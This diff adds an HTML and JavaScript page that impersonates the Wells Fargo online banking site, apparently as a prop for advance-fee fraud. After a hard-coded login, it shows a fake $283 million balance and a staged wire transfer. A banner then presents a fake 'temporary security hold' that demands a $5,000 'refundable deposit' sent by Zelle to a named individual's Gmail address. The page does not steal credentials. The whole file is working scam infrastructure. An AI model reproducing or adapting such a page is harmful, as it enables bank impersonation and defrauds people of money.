@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Wells Fargo</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body,html{height:100%;font-family:'Inter',sans-serif;background:#f8f9fa;color:#111;overflow:hidden}
+header{background:#c00;color:#fff;padding:14px 20px;display:flex;justify-content:space-between;align-items:center;position:fixed;top:0;left:0;right:0;z-index:1000;height:64px;font-size:15px}
+.logo{font-size:28px;font-weight:800;letter-spacing:-1px}
+.links a{color:#fff;text-decoration:none;margin:0 10px;font-size:14px}
+.links a:last-child{background:#a00;padding:8px 16px;border-radius:20px;font-weight:600}
+#loginPage{background:url('https://iili.io/fBg3KVR.jpg') center/cover no-repeat;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:20px}
+.login-box{background:rgba(255,255,255,0.97);padding:40px 30px;border-radius:16px;box-shadow:0 20px 50px rgba(0,0,0,0.3);width:100%;max-width:400px;text-align:center}
+.input-wrapper{position:relative;margin:12px 0}
+input[type=text],input[type=password],input[type=number]{width:100%;padding:16px 16px 16px 16px;border:1px solid #ddd;border-radius:12px;font-size:17px;background:#fff}
+.show{position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#c00;font-size:14px;cursor:pointer;z-index:2}
+button{background:#c00;color:#fff;border:none;padding:16px;border-radius:12px;font-size:17px;font-weight:600;width:100%;margin-top:20px;cursor:pointer}
+.error{color:#c00;margin-top:10px;display:none;font-weight:500}
+#loadingScreen,#verifyScreen,#paymentLoading{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;display:none;align-items:center;justify-content:center;flex-direction:column;z-index:9999}
+.spinner{width:64px;height:64px;border:8px solid #f0f0f0;border-top:8px solid #c00;border-radius:50%;animation:s 1.2s linear infinite}
+@keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+.page{display:none;flex-direction:column;height:100%}
+.top-bar{background:#fff;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 12px rgba(0,0,0,0.1);font-size:18px;font-weight:600;position:relative;z-index:10}
+.back-arrow{color:#c00;font-size:30px;cursor:pointer}
+.content{flex:1;overflow-y:auto;padding:20px;background:#f8f9fa}
+.greeting{font-size:26px;margin-bottom:20px;line-height:1.3}
+.greeting strong{font-weight:700}
+.card{background:#fff;border-radius:16px;padding:28px;box-shadow:0 6px 25px rgba(0,0,0,0.1);margin-bottom:20px}
+.balance{font-size:46px;font-weight:700;color:#c00;margin:10px 0}
+.available{font-size:15px;color:#666;margin-top:6px}
+.btn-paytransfer{background:#c00;color:#fff;padding:16px;border-radius:12px;font-size:16px;font-weight:600;width:100%;margin-top:28px;cursor:pointer}
+.transaction-list{background:#fff;border-radius:16px;padding:20px;margin-top:20px;box-shadow:0 4px 15px rgba(0,0,0,0.08);display:none}
+.tx-item{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid #eee}
+.tx-item:last-child{border:none}
+.tx-left strong{font-size:17px;display:block}
+.tx-left small{color:#666;font-size:14px}
+.tx-right{font-size:20px;font-weight:700;color:#c00}
+.pending{color:#e67e22!important;font-weight:600}
+.bottom-nav{position:fixed;bottom:0;left:0;right:0;background:#fff;height:84px;border-top:1px solid #ddd;display:flex;box-shadow:0 -4px 20px rgba(0,0,0,0.06);z-index:1000}
+.nav-item{flex:1;text-align:center;padding-top:12px;color:#666;font-size:11px}
+.nav-item.active{color:#c00;font-weight:700}
+.pay-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;padding:20px}
+.pay-btn{background:#fff;border-radius:20px;padding:30px 20px;text-align:center;box-shadow:0 8px 25px rgba(0,0,0,0.12);cursor:pointer;transition:.2s;position:relative}
+.pay-btn.locked{opacity:0.45;pointer-events:none}
+.pay-btn.locked::after{content:"There is a pending transaction";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.9);color:#fff;padding:14px 26px;border-radius:12px;font-size:16px;font-weight:700;z-index:10;white-space:nowrap}
+.icon-circle{width:90px;height:90px;border-radius:50%;background:#000;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.icon-circle.purple{background:#6a0dad}
+.icon-circle img{max-width:75px;max-height:75px;object-fit:contain}
+.amount-box{background:#fff;border-radius:20px;padding:40px 30px;text-align:center;box-shadow:0 15px 40px rgba(0,0,0,.15);max-width:420px;margin:40px auto}
+.amount-input{font-size:36px;font-weight:700;text-align:center;border:none;border-bottom:3px solid #c00;padding:10px 0;width:100%;outline:none}
+.amount-error{color:#c00;font-weight:600;margin-top:15px;display:none}
+.confirm-card{background:#fff;border-radius:20px;margin:20px auto;max-width:420px;box-shadow:0 20px 50px rgba(0,0,0,.15);overflow:hidden}
+.confirm-header{background:#c00;color:#fff;padding:32px 20px 24px;text-align:center}
+.confirm-header .circle{width:100px;height:100px;background:#fff;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center}
+.confirm-header .circle svg{width:60px;height:60px}
+.confirm-header h1{font-size:26px;font-weight:700}
+.confirm-body{padding:30px;text-align:center}
+.confirm-row{display:flex;justify-content:space-between;padding:16px 0;border-bottom:1px solid #eee;font-size:16px}
+.confirm-row:last-child{border:none}
+.confirm-row .label{color:#555}
+.confirm-row .value{font-weight:600}
+.confirm-btn{background:#c00;color:#fff;border:none;padding:18px;border-radius:16px;font-size:18px;font-weight:700;width:100%;margin-top:30px;cursor:pointer}
+.final-success{text-align:center;padding:80px 20px}
+.final-success svg{width:120px;height:120px;color:#c00;margin-bottom:30px}
+.final-success h1{font-size:32px;font-weight:700;color:#c00;margin:20px 0}
+.final-success p{font-size:20px;color:#333}
+.done-btn{background:#c00;color:#fff;padding:16px 60px;border:none;border-radius:30px;font-size:18px;margin-top:40px;cursor:pointer}
+#actionBanner{position:fixed;bottom:100px;left:50%;transform:translateX(-50%);background:#c00;color:#fff;padding:16px 36px;border-radius:50px;font-weight:700;font-size:17px;box-shadow:0 12px 40px rgba(204,0,0,.5);z-index:9999;cursor:pointer;display:none;animation:pop .8s ease-out forwards,bounce 2s infinite 1s}
+@keyframes pop{0%{opacity:0;transform:translateX(-50%) translateY(100px)}100%{opacity:1;transform:translateX(-50%) translateY(0)}}
+@keyframes bounce{0%,100%{transform:translateX(-50%) translateY(0)}50%{transform:translateX(-50%) translateY(-12px)}}
+#explainModal,#zelleModal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center;z-index:10000;padding:20px}
+.explain-box,.zelle-box{background:#fff;border-radius:28px;padding:40px 30px;text-align:center;max-width:420px;width:100%;box-shadow:0 30px 80px rgba(0,0,0,.5);position:relative}
+.explain-box .close,.zelle-box .close{color:#aaa;font-size:40px;position:absolute;top:10px;right:16px;cursor:pointer}
+.explain-box h2,.zelle-box h2{font-size:27px;font-weight:700;color:#c00;margin-bottom:12px}
+.explain-box p,.zelle-box p{color:#444;font-size:16.5px;margin:20px 0;line-height:1.6}
+.proceed-btn,.pay-now-btn{background:#c00;color:#fff;padding:18px;border:none;border-radius:18px;font-size:18px;font-weight:700;width:100%;margin-top:20px;cursor:pointer}
+.zelle-box img{width:100px;margin:18px auto;display:block}
+.zelle-details{background:#f7f5ff;border-radius:18px;padding:22px;margin:20px 0;text-align:left;border:2px dashed #6a0dad}
+.zelle-details div{display:flex;justify-content:space-between;align-items:center;padding:14px 0;border-bottom:1px solid #e0d7ff;font-size:15.5px}
+.zelle-details div:last-child{border:none}
+.zelle-details strong{color:#333}
+.copy-btn{background:#6a0dad;color:#fff;padding:8px 16px;border-radius:25px;font-size:13px;font-weight:600;cursor:pointer;margin-left:10px}
+.copied{margin-left:10px;color:#28a745;font-weight:700;opacity:0;font-size:14px;transition:opacity .3s}
+</style>
+</head>
+<body>
+
+<!-- LOGIN PAGE -->
+<div id="loginPage">
+  <header><div class="logo">WELLS FARGO</div><div class="links"><a href="#">Help</a><a href="#">Español</a><a href="#">Sign On</a></div></header>
+  <div class="login-box">
+    <h3>Good day</h3><p>Sign on to manage your accounts.</p>
+    <form id="loginForm">
+      <div class="input-wrapper"><input type="text" id="username" placeholder="Username" required></div>
+      <div class="input-wrapper"><input type="password" id="password" placeholder="Password" required><span class="show" onclick="togglePass()">Show</span></div>
+      <button type="submit">Sign On</button>
+    </form>
+    <div id="error" class="error">Username or password is incorrect</div>
+  </div>
+</div>
+
+<!-- Loading Screens -->
+<div id="loadingScreen"><div class="spinner"></div><h2 style="color:#c00;margin-top:20px">Signing you on securely...</h2></div>
+<div id="verifyScreen"><div class="spinner"></div><h2 style="color:#c00;margin-top:30px">Verifying recipient...</h2></div>
+<div id="paymentLoading"><div class="spinner"></div><h2 style="color:#c00;margin-top:30px">Processing payment...</h2></div>
+
+<!-- DASHBOARD -->
+<div id="dashboard" class="page">
+  <div class="top-bar"><div></div><div>Accounts</div><div style="color:#c00;font-weight:600;cursor:pointer" onclick="location.reload()">Sign off</div></div>
+  <div class="content">
+    <div class="greeting">Good day,<br><strong>George</strong></div>
+    <div class="card">
+      <div style="font-size:16px;color:#666">Crown Classic ...7018</div>
+      <div class="balance" id="balanceAmount">$283,008,000.00</div>
+      <div class="available">Available balance</div>
+      <button class="btn-paytransfer" onclick="show('payTransfer')">Pay & Transfer</button>
+    </div>
+    <div class="transaction-list" id="txList">
+      <div class="tx-item">
+        <div class="tx-left"><strong>Wire Transfer to George Gurusaransingh</strong><small>Today • Pending</small></div>
+        <div class="tx-right pending">-$283,008,000.00</div>
+      </div>
+    </div>
+  </div>
+  <div class="bottom-nav"><div class="nav-item">House</div><div class="nav-item">Deposit</div><div class="nav-item active">Pay & Transfer</div><div class="nav-item">Explore</div><div class="nav-item">Menu</div></div>
+</div>
+
+<!-- PAY & TRANSFER -->
+<div id="payTransfer" class="page">
+  <div class="top-bar"><span class="back-arrow" onclick="show('dashboard')">Back</span><div>Pay & Transfer</div><div></div></div>
+  <div class="content">
+    <div class="pay-grid">
+      <div class="pay-btn" onclick="alert('Transfer')"><div class="icon-circle"><img src="https://iili.io/fnAxNLB.md.png"></div><div>Transfer</div></div>
+      <div class="pay-btn" onclick="alert('Zelle')"><div class="icon-circle purple"><img src="https://i.postimg.cc/CKxrgH0F/1659810938zelle-icon-png.webp"></div><div>Send Money</div></div>
+      <div class="pay-btn" onclick="alert('Pay Bills')"><div class="icon-circle"><img src="https://i.postimg.cc/DymqnjJD/download-hd-white-hand-to-hand-money-cash-payment-icon-png-7017516949746607uwoslenpn-removebg-previe.png"></div><div>Pay Bills</div></div>
+      <div class="pay-btn" id="wireMoneyBtn"><div class="icon-circle"><img src="https://iili.io/fnAbz21.png"></div><div>Wire Money</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- EXTERNAL ACCOUNT FORM -->
+<div id="externalForm" class="page">
+  <div class="top-bar"><span class="back-arrow" onclick="show('payTransfer')">Back</span><div>Add External Account</div><div></div></div>
+  <div class="content">
+    <div style="max-width:500px;margin:0 auto;padding:20px">
+      <div style="margin-bottom:8px;font-size:14px;color:#555">Account number</div>
+      <input type="text" id="acctNum" placeholder="Enter account number">
+      <div style="margin:20px 0 8px;font-size:14px;color:#555">Routing number</div>
+      <input type="text" id="routingNum" placeholder="Enter routing number">
+      <button onclick="checkAccount()">Continue</button>
+    </div>
+  </div>
+</div>
+
+<!-- AMOUNT SCREEN -->
+<div id="amountScreen" class="page">
+  <div class="top-bar"><span class="back-arrow" onclick="show('externalForm')">Back</span><div>Transfer Amount</div><div></div></div>
+  <div class="content">
+    <div class="amount-box">
+      <h2>Enter Amount</h2>
+      <p>You must transfer the full available balance of $283,008,000.00</p>
+      <input type="number" id="transferAmount" class="amount-input" value="283008000.00">
+      <div id="amountError" class="amount-error">You must transfer the full available balance</div>
+      <button class="confirm-btn" onclick="validateAmount()">Continue to Verify</button>
+    </div>
+  </div>
+</div>
+
+<!-- VERIFY RECIPIENT -->
+<div id="verifyResult" class="page">
+  <div class="top-bar"><span class="back-arrow" onclick="show('dashboard')">Back</span><div>Confirm Recipient</div><div></div></div>
+  <div class="content">
+    <div class="confirm-card">
+      <div class="confirm-header">
+        <div class="circle"><svg viewBox="0 0 24 24" fill="none" stroke="#c00" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+        <h1>Recipient Verified</h1>
+      </div>
+      <div class="confirm-body">
+        <div class="confirm-row"><div class="label">Account holder</div><div class="value">George Gurusaransingh</div></div>
+        <div class="confirm-row"><div class="label">Bank</div><div class="value">Chase</div></div>
+        <div class="confirm-row"><div class="label">Amount</div><div class="value">$283,008,000.00</div></div>
+        <button class="confirm-btn" onclick="confirmPayment()">Confirm & Send Full Amount</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PAYMENT SUCCESS -->
+<div id="paymentSuccess" class="page">
+  <div class="top-bar"><div></div><div>Payment Sent</div><div></div></div>
+  <div class="content">
+    <div class="final-success">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>
+      <h1>Payment is on the way<br>to George Gurusaransingh</h1>
+      <p>Full amount of $283,008,000.00 sent successfully.</p>
+      <button class="done-btn" onclick="paymentSent()">Done</button>
+    </div>
+  </div>
+</div>
+
+<!-- ACTION BANNER -->
+<div id="actionBanner" onclick="document.getElementById('explainModal').style.display='flex'">
+  ACTION REQUIRED – Complete Deposit to Release Funds
+</div>
+
+<!-- EXPLAIN MODAL -->
+<div id="explainModal">
+  <div class="explain-box">
+    <span class="close" onclick="this.parentElement.parentElement.style.display='none'">×</span>
+    <h2>Temporary Security Hold</h2>
+    <p>Due to federal banking regulations and the large amount of your incoming wire transfer, Wells Fargo has placed a <strong>temporary security hold</strong>.<br><br>
+    To verify your identity and release the full $283,008,000.00 immediately, a one-time refundable deposit of <strong>$5,000.00</strong> is required via Zelle®.<br><br>
+    This deposit will be <strong>automatically refunded</strong> within minutes after verification.</p>
+    <button class="proceed-btn" onclick="document.getElementById('explainModal').style.display='none';document.getElementById('zelleModal').style.display='flex'">Proceed with Deposit</button>
+  </div>
+</div>
+
+<!-- ZELLE MODAL -->
+<div id="zelleModal">
+  <div class="zelle-box">
+    <span class="close" onclick="this.parentElement.parentElement.style.display='none'">×</span>
+    <h2>Send with Zelle®</h2>
+    <img src="https://i.postimg.cc/CKxrgH0F/1659810938zelle-icon-png.webp" alt="Zelle">
+    <p>Please send the <strong>$5,000.00 security deposit</strong> to the Wells Fargo verification account below:</p>
+    <div class="zelle-details">
+      <div><strong>Name</strong><span>Margarita Garcia<button class="copy-btn" onclick="copyToClipboard('Margarita Garcia',this)">Copy</button><span class="copied">Copied!</span></span></div>
+      <div><strong>Email</strong><span>margaritagarcia4949@gmail.com<button class="copy-btn" onclick="copyToClipboard('margaritagarcia4949@gmail.com',this)">Copy</button><span class="copied">Copied!</span></span></div>
+    </div>
+    <button class="pay-now-btn" onclick="zelleSent()">I Have Sent the $5,000.00</button>
+  </div>
+</div>
+
+<script>
+const USER = "Drosophila";
+const PASS = "George";
+const STORAGE_KEY = "wf_283m_sent";
+
+function transferSent() { return localStorage.getItem(STORAGE_KEY) === "true"; }
+function markSent() { localStorage.setItem(STORAGE_KEY, "true"); }
+
+function show(id) {
+  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+  document.getElementById(id).style.display = 'flex';
+  if (id === 'payTransfer' || id === 'dashboard') {
+    document.getElementById('wireMoneyBtn').classList.toggle('locked', transferSent());
+  }
+}
+
+document.getElementById('wireMoneyBtn').onclick = () => { if (!transferSent()) show('externalForm'); };
+
+function checkAccount() {
+  const a = document.getElementById('acctNum').value.trim();
+  const r = document.getElementById('routingNum').value.trim();
+  if (a === "568306560" && r === "021100361") show('amountScreen');
+  else if (a && r) alert("Account could not be verified.");
+}
+
+function validateAmount() {
+  const amt = parseFloat(document.getElementById('transferAmount').value || 0);
+  if (amt === 283008000.00) {
+    document.getElementById('amountError').style.display = 'none';
+    document.getElementById('verifyScreen').style.display = 'flex';
+    setTimeout(() => { document.getElementById('verifyScreen').style.display = 'none'; show('verifyResult'); }, 2800);
+  } else document.getElementById('amountError').style.display = 'block';
+}
+
+function confirmPayment() {
+  document.getElementById('paymentLoading').style.display = 'flex';
+  setTimeout(() => { document.getElementById('paymentLoading').style.display = 'none'; show('paymentSuccess'); }, 3500);
+}
+
+function paymentSent() {
+  document.getElementById('balanceAmount').textContent = "$0.00";
+  document.getElementById('txList').style.display = 'block';
+  markSent();
+  show('dashboard');
+  setTimeout(() => document.getElementById('actionBanner').style.display = 'block', 800);
+}
+
+function zelleSent() {
+  document.getElementById('zelleModal').style.display = 'none';
+  alert("Payment received! Your $283,008,000.00 will be released and available within 5–10 minutes.\n\nThank you for your cooperation.");
+}
+
+function copyToClipboard(text, btn) {
+  navigator.clipboard.writeText(text).then(() => {
+    const msg = btn.nextElementSibling;
+    msg.style.opacity = '1';
+    setTimeout(() => msg.style.opacity = '0', 2000);
+  });
+}
+
+document.getElementById('loginForm').onsubmit = e => {
+  e.preventDefault();
+  if (document.getElementById('username').value === USER && document.getElementById('password').value === PASS) {
+    document.getElementById('loginPage').style.display = 'none';
+    document.getElementById('loadingScreen').style.display = 'flex';
+    setTimeout(() => {
+      document.getElementById('loadingScreen').style.display = 'none';
+      show('dashboard');
+      if (transferSent()) {
+        document.getElementById('balanceAmount').textContent = "$0.00";
+        document.getElementById('txList').style.display = 'block';
+        setTimeout(() => document.getElementById('actionBanner').style.display = 'block', 1000);
+      }
+    }, 2500);
+  } else document.getElementById('error').style.display = 'block';
+};
+
+function togglePass() {
+  const p = document.getElementById('password');
+  p.type = p.type === 'password' ? 'text' : 'password';
+}
+
+// Start on login
+show('loginPage');
+</script>
+</body>
+</html>
